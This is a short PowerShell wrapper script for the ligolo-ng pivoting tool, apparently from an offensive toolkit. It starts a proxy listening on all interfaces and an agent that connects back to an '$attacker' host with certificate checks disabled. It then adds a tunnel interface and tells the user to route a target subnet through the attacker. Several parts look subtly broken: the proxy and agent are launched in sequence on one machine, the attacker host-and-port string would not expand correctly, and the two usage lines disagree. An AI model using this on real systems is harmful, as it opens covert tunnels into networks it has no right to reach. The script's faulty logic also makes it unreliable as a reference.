# Ligolo-ng Pivot Wrapper
# Usage: .\ligolo-wrapper.ps1 -attacker <ip> -interface <name>
param(
    [string]$attacker,
    [string]$interface = "ligolo",
    [switch]$start,
    [switch]$stop
)

$agentPath = "C:\cyberstrike\tools\ligolo-agent.exe"
$proxyPath = "C:\cyberstrike\tools\ligolo-proxy.exe"

if ($start) {
    Write-Host "[*] Starting ligolo-ng proxy on $attacker"
    & $proxyPath -listen 0.0.0.0:11601
    
    Write-Host "[*] Starting ligolo-ng agent"
    & $agentPath -connect $attacker:11601 -ignore-cert
    
    Write-Host "[*] Adding ligolo interface"
    netsh interface ip add address $interface 10.10.10.1/24
    
    Write-Host "[*] Ligolo tunnel established"
    Write-Host "[*] Add routes on attacker: sudo ip route add TARGET_SUBNET dev ligolo"
} elseif ($stop) {
    Write-Host "[*] Stopping ligolo-ng"
    Stop-Process -Name "ligolo*" -Force -ErrorAction SilentlyContinue
    Write-Host "[*] Ligolo stopped"
} else {
    Write-Host "Usage: .\ligolo-wrapper.ps1 -attacker <ip> [-start|-stop]"
}
